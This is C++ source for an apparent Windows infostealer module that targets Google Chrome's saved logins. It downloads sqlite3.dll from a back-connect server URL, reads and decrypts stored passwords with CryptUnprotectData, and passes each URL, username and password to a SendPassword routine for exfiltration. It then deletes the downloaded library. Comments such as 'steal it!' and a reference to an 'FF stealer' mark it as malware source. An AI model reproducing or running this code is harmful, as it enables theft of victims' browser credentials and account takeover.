
// Only works with 2009 version! Newer version stores it somewhere else..

// Based on Google Chrome Password Decrypter + the ic0de post + the FF stealer + my intelligence
// http://sourceforge.net/projects/chromepassdecry/
// http://www.ic0de.org/showthread.php?6170-Chrome-Autocomplete-Passwords-how-they-are-saved-and-how-to-decrypt-em
// http://www.switchonthecode.com/tutorials/how-google-chrome-stores-passwords

#include "Windows.h"
#include "Urlmon.h"
#include "Config.h"
#include "sqlite3.h"


extern HANDLE ChromeThread;            // external
char SqliteLibraryFilename[MAX_PATH] = "";

void DecryptChromePasswords(char * ChromeProfilePath);
static int CallbackChromeAccounts(void *pFFAccData, int argc, char **argv, char **azColName);



// Sqlite Functions and stuff
typedef SQLITE_API int (* Sqlite_Func_Open) (
  const char *filename,   /* Database filename (UTF-8) */
  sqlite3 **ppDb          /* OUT: SQLite db handle */
);
typedef SQLITE_API int (* Sqlite_Func_Exec) (
  sqlite3*,                                  /* An open database */
  const char *sql,                           /* SQL to be evaluated */
  int (*callback)(void*,int,char**,char**),  /* Callback function */
  void *,                                    /* 1st argument to callback */
  char **errmsg                              /* Error msg written here */
);
typedef SQLITE_API void (* Sqlite_Func_Free) (void*);
typedef SQLITE_API int (* Sqlite_Func_Close) (sqlite3 *);

typedef SQLITE_API int (* Func_sqlite3_blob_read)(sqlite3_blob *, void *Z, int N, int iOffset);
typedef SQLITE_API int (* Func_sqlite3_blob_close)(sqlite3_blob *);
typedef SQLITE_API int (* Func_sqlite3_blob_bytes)(sqlite3_blob *);
typedef SQLITE_API int (* Func_sqlite3_blob_open)(sqlite3*, const char *zDb, const char *zTable, const char *zColumn, sqlite3_int64 iRow, int flags, sqlite3_blob **ppBlob);


Sqlite_Func_Open csqlite3_open = NULL;
Sqlite_Func_Exec csqlite3_exec = NULL;
Sqlite_Func_Free csqlite3_free = NULL;
Sqlite_Func_Close csqlite3_close = NULL;
Func_sqlite3_blob_read csqlite3_blob_read = NULL;
Func_sqlite3_blob_close csqlite3_blob_close = NULL;
Func_sqlite3_blob_bytes csqlite3_blob_bytes = NULL;
Func_sqlite3_blob_open csqlite3_blob_open = NULL;




DWORD WINAPI GetChromeThread(__in  char * ChromePath)
{
    // check if its downloaded (check if we can open it exclusively) :ugly:
    // maybe downloading it in future by InternetReadFile etc
    while (1)
    {
        Sleep(1000);
        HANDLE TempFile = CreateFileA(SqliteLibraryFilename, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (TempFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(TempFile);
            break;
        }

        // wait 1 second
        Sleep(1000);
    }

    // load the library and its functions (like for FF)
    HMODULE SqliteLibrary = LoadLibraryA(SqliteLibraryFilename);
    if (!SqliteLibrary)
        return 0;

    if (!(csqlite3_open = (Sqlite_Func_Open) GetProcAddress(SqliteLibrary, "sqlite3_open")) ||
        !(csqlite3_exec = (Sqlite_Func_Exec) GetProcAddress(SqliteLibrary, "sqlite3_exec")) ||
        !(csqlite3_free = (Sqlite_Func_Free) GetProcAddress(SqliteLibrary, "sqlite3_free")) ||
        !(csqlite3_close = (Sqlite_Func_Close) GetProcAddress(SqliteLibrary, "sqlite3_close")) ||
        !(csqlite3_blob_read = (Func_sqlite3_blob_read) GetProcAddress(SqliteLibrary, "sqlite3_blob_read")) ||
        !(csqlite3_blob_close = (Func_sqlite3_blob_close) GetProcAddress(SqliteLibrary, "sqlite3_blob_close")) ||
        !(csqlite3_blob_bytes = (Func_sqlite3_blob_bytes) GetProcAddress(SqliteLibrary, "sqlite3_blob_bytes")) ||
        !(csqlite3_blob_open = (Func_sqlite3_blob_open) GetProcAddress(SqliteLibrary, "sqlite3_blob_open")) )
        return 0;

    // steal it!
    DecryptChromePasswords(ChromePath);

    // remove the downloaded library
    FreeLibrary(SqliteLibrary);
    DeleteFileA(SqliteLibraryFilename);
    *SqliteLibraryFilename = '\0';

    return 0;
}


// Warning: Call this function only once, it is not thread safe (the downloaded sqlite library will be deleted after usage)
// Calling this with other than the current profile paths does not make any sense, because it needs the current user context (?), SHA1 hash (?) to decrypt

int GetChrome(char * AppDataLocal)
{
    // check if Chrome is installed (Profile Path)
    char * ChromeProfilePath = new char[MAX_PATH];
    strcpy(ChromeProfilePath, AppDataLocal);
    strcat(ChromeProfilePath, "\\Google\\Chrome\\User Data\\Default");

    // returns if Chrome isn't installed
    if (GetFileAttributesA(ChromeProfilePath) == INVALID_FILE_ATTRIBUTES)
        return 0;

    
    // download the sqlite library
#ifdef SqlitePath
    char SqliteUrl[MAX_PATH] = SqlitePath;
#else
    char SqliteUrl[MAX_PATH];
    strcpy(SqliteUrl, BackConnectURLA);
    strcpy(strrchr(SqliteUrl, '/') + 1, "sqlite3.dll");
#endif

    GetTempPathA(MAX_PATH, SqliteLibraryFilename);
    GetTempFileNameA(SqliteLibraryFilename, "bc", 0, SqliteLibraryFilename);

    if (URLDownloadToFileA(NULL, SqliteUrl, SqliteLibraryFilename, 0, NULL) != S_OK)
        return 0;


    // start it in a thread (the download takes undefined time)
    ChromeThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&GetChromeThread, ChromeProfilePath, 0, NULL);


    return 1;
}


sqlite3 *lDB = NULL;


void DecryptChromePasswords(char * ChromeProfilePath)
{
    char str1[255] = "", str2[255] = "";
    strcpy(str1,ChromeProfilePath);
    strcpy(str2,ChromeProfilePath);
    strcat(str1,"\\Web Data");
    strcat(str2,"\\tmpWeb Data");

    // copy it because it may be in use
    CopyFileA(str1, str2, false);

    // do the SQL statement
    char *lErrMsg = 0;
    BYTE BufferAccData[1024];
    memset(&BufferAccData, 0, sizeof(BufferAccData));

    if (csqlite3_open(str2, &lDB) != SQLITE_OK)
        return;

    if (csqlite3_exec(lDB, "SELECT origin_url, username_value, password_value FROM logins", CallbackChromeAccounts, BufferAccData, &lErrMsg))
        csqlite3_free(lErrMsg);

    csqlite3_close(lDB);

}


static int CallbackChromeAccounts(void *pFFAccData, int argc, char **argv, char **azColName)
{
    int lErrorNo = 0;
    char *lClearText = NULL;

    for(int lCounter = 0; lCounter < argc; lCounter += 8)
    {
        if (argv[lCounter])
        {
            // Url: lCounter+0
            // User: lCounter+1
            // Encrypted password: lCounter+2
            BYTE EncryptedPassword[1024];

            sqlite3_blob * blob;
            if (csqlite3_blob_open(lDB, "main", "logins", "password_value", 1, 0, &blob) != SQLITE_OK ||
                csqlite3_blob_read(blob, EncryptedPassword, csqlite3_blob_bytes(blob), 0))
                return 0;

            DATA_BLOB DataIn;
            DataIn.pbData = EncryptedPassword;
            DataIn.cbData = csqlite3_blob_bytes(blob);
            csqlite3_blob_close(blob);

            DATA_BLOB DataOut;

            if (CryptUnprotectData(&DataIn,NULL,NULL,NULL,NULL,0,&DataOut))
            {
                char Password[1024];
                strncpy(Password, (char *)DataOut.pbData, DataOut.cbData);
                Password[DataOut.cbData]='\0';

                SendPassword(Password_Chrome, argv[lCounter+0], argv[lCounter+1], Password);
            }
            else
                SendPassword(Password_Chrome, argv[lCounter+0], argv[lCounter+1], "");
        }
    }

  return 0;  
}

